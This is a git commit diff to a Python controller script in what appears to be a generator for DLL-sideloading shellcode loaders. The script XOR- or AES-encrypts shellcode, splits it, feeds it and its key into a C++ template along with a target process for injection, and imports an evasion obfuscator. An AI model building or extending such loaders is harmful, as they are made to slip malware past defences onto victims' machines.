38bae8922be636621947e69b558755e26f7beb8a
efchatz <43434138+efchatz@users.noreply.github.com>
2023-11-06 02:48:47 +0200

    Update Controller.py

--- Templates/Controller.py
+++ Templates/Controller.py
@@ -2,12 +2,12 @@ import random
 import os
 
 from Dll_Names.Dlls import dll_names
-from Encryption.Xor import DoXor,key,key_hex
-from Templates.Split_Xor_Shellcode import split_xor_shellcode
+from Encryption.Xor import DoXor,key,keyHex
+from Templates.Split_Xor_Shellcode import split_xor_shellcode,split_aes_shellcode
 from Templates.C_Template import template
 from Templates.Arguments  import parse_arguments
 from Templates.Shellcode import EncryptedShellcode
-from Encryption.AES import encryptAES,keyAES
+from Encryption.AES import encryptAES,keyAES,returnKey
 from Evasion.Obfuscator import obfuscatorArray,obfuscatorSize
 
 
@@ -53,27 +53,28 @@ def Controller():
     if encryption_type == "XOR":
         ciphertext = DoXor(plaintext, key)
         ciphertext_split = split_xor_shellcode(ciphertext)
-        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
+        key_hex = keyHex(key)
         shellcode=EncryptedShellcode(shellcode_var, ciphertext_split)
+        key_hex = f'''"{key_hex}"'''
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
+
     elif encryption_type == "AES":
         ciphertext = encryptAES(plaintext,keyAES)
-        ciphertext_split = split_xor_shellcode(ciphertext)
-        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
+        ciphertext_split = split_aes_shellcode(ciphertext)
+        keyAES2 = returnKey(keyAES)
         shellcode=EncryptedShellcode(shellcode_var, ciphertext_split)
+        key_hex = f'''{{keyAES2}}'''
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES2,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
+
     # Create the output folder if it doesn't exist
     if not os.path.exists(output_folder):
         os.makedirs(output_folder)
 
     # Generate output file path
     output_filename = os.path.join(output_folder, "main.cpp")
-    output_shellcode=os.path.join(output_folder,"code.h")
 
     # Write encoded shellcode to output file
     with open(output_filename, "w") as f:
         f.write(c_template)
-    with open(output_shellcode,"w") as f:
-        f.write(shellcode)
     print("Create a new visual studio project and copy the files located at " + output_folder + " Folder \n")
     print("DLL SIDELOADING Template has been saved to: " + output_filename)
-    print("Shellcode Template has been saved to: " + output_shellcode)
-
